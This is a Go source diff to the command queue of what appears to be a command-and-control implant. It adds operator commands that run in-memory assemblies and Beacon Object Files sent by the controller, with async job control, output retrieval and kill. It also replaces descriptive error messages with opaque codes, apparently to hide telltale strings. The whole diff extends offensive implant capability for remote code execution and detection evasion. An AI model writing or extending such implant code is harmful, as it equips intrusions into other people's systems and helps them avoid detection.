@@ -100,7 +100,7 @@ func (cq *CommandQueue) RegisterCommand(cmd CommandInterface) {
 func (cq *CommandQueue) AddCommands(jsonData string) error {
 	var commands []Command
 	if err := json.Unmarshal([]byte(jsonData), &commands); err != nil {
-		return fmt.Errorf("failed to parse commands: %v", err)
+		return fmt.Errorf(Err(E18))
 	}
 
 	cq.mu.Lock()
@@ -130,6 +130,103 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	// Apply session environment variables
 	cq.applySessionEnvironment()
 
+	// Handle inline-assembly job management commands FIRST
+	if cmd.Command == "inline-assembly-jobs" {
+		if handler, exists := cq.cmdRegistry["inline-assembly-jobs"]; exists {
+			result := handler.Execute(cq.cmdContext, []string{})
+			result.Command = cmd
+			result.CompletedAt = time.Now().Format(time.RFC3339)
+			return &result, nil
+		} else {
+			return &CommandResult{
+				Command:     cmd,
+				ErrorString: Err(E19),
+				ExitCode:    1,
+				CompletedAt: time.Now().Format(time.RFC3339),
+			}, nil
+		}
+	}
+
+	// Handle inline-assembly-jobs-clean command
+	if strings.HasPrefix(cmd.Command, "inline-assembly-jobs-clean") {
+		parts := strings.Fields(cmd.Command)
+		if handler, exists := cq.cmdRegistry["inline-assembly-jobs-clean"]; exists {
+			args := []string{}
+			if len(parts) > 1 {
+				args = parts[1:]
+			}
+			result := handler.Execute(cq.cmdContext, args)
+			result.Command = cmd
+			result.CompletedAt = time.Now().Format(time.RFC3339)
+			return &result, nil
+		}
+	}
+
+	// Handle inline-assembly-jobs-stats command
+	if cmd.Command == "inline-assembly-jobs-stats" {
+		if handler, exists := cq.cmdRegistry["inline-assembly-jobs-stats"]; exists {
+			result := handler.Execute(cq.cmdContext, []string{})
+			result.Command = cmd
+			result.CompletedAt = time.Now().Format(time.RFC3339)
+			return &result, nil
+		}
+	}
+
+	// Handle inline-assembly-output command WITH arguments
+	if strings.HasPrefix(cmd.Command, "inline-assembly-output ") {
+		parts := strings.Fields(cmd.Command)
+		if handler, exists := cq.cmdRegistry["inline-assembly-output"]; exists {
+			args := []string{}
+			if len(parts) > 1 {
+				args = parts[1:]
+			}
+			result := handler.Execute(cq.cmdContext, args)
+			result.Command = cmd
+			result.CompletedAt = time.Now().Format(time.RFC3339)
+			return &result, nil
+		}
+	}
+
+	// Handle inline-assembly-kill command WITH arguments
+	if strings.HasPrefix(cmd.Command, "inline-assembly-kill ") {
+		parts := strings.Fields(cmd.Command)
+		if handler, exists := cq.cmdRegistry["inline-assembly-kill"]; exists {
+			args := []string{}
+			if len(parts) > 1 {
+				args = parts[1:]
+			}
+			result := handler.Execute(cq.cmdContext, args)
+			result.Command = cmd
+			result.CompletedAt = time.Now().Format(time.RFC3339)
+			return &result, nil
+		}
+	}
+
+	// Handle inline-assembly commands WITH data (actual assembly execution)
+	if strings.HasPrefix(cmd.Command, "inline-assembly") && cmd.Data != "" {
+		var testParse map[string]interface{}
+		_ = json.Unmarshal([]byte(cmd.Data), &testParse)
+
+		handlerName := "inline-assembly"
+		if strings.Contains(cmd.Command, "async") {
+			handlerName = "inline-assembly-async"
+		}
+
+		if handler, exists := cq.cmdRegistry[handlerName]; exists {
+			result := handler.Execute(cq.cmdContext, []string{})
+			result.Command = cmd
+			result.CompletedAt = time.Now().Format(time.RFC3339)
+			return &result, nil
+		} else {
+			return &CommandResult{
+				Command:     cmd,
+				ErrorString: Err(E19),
+				ExitCode:    1,
+				CompletedAt: time.Now().Format(time.RFC3339),
+			}, nil
+		}
+	}
+
 	// Handle upload chunks
 	if cmd.Command == "upload" && cmd.Data != "" {
 		result, err := HandleUploadChunk(cmd, cq.cmdContext)
@@ -145,6 +242,18 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		return result, nil
 	}
 
+	// Handle async BOF commands WITH data
+	if strings.HasPrefix(cmd.Command, "bof-async") && cmd.Data != "" {
+		result := cq.processBOFAsync(cmd)
+		return &result, nil
+	}
+
+	// Handle regular BOF commands WITH data
+	if strings.HasPrefix(cmd.Command, "bof") && cmd.Data != "" {
+		result := cq.processBOF(cmd)
+		return &result, nil
+	}
+
 	// Handle download continuation
 	if cmd.Filename != "" && cmd.CurrentChunk > 0 {
 		cq.mu.Lock()
@@ -154,8 +263,8 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		if !exists {
 			return &CommandResult{
 				Command:     cmd,
-				Error:       fmt.Errorf("no active download found for %s", cmd.Filename),
-				ErrorString: fmt.Sprintf("no active download found for %s", cmd.Filename),
+				Error:       fmt.Errorf(Err(E4)),
+				ErrorString: Err(E4),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}, nil
@@ -164,8 +273,8 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 		if !downloadInfo.InProgress {
 			return &CommandResult{
 				Command:     cmd,
-				Error:       fmt.Errorf("download for %s is no longer active", cmd.Filename),
-				ErrorString: fmt.Sprintf("download for %s is no longer active", cmd.Filename),
+				Error:       fmt.Errorf(Err(E4)),
+				ErrorString: Err(E4),
 				ExitCode:    1,
 				CompletedAt: time.Now().Format(time.RFC3339),
 			}, nil
@@ -201,8 +310,8 @@ func (cq *CommandQueue) ProcessNextCommand() (*CommandResult, error) {
 	if len(args) == 0 {
 		return &CommandResult{
 			Command:     cmd,
-			Error:       fmt.Errorf("empty command"),
-			ErrorString: "empty command",
+			Error:       fmt.Errorf(Err(E1)),
+			ErrorString: Err(E1),
 			ExitCode:    1,
 			CompletedAt: time.Now().Format(time.RFC3339),
 		}, nil
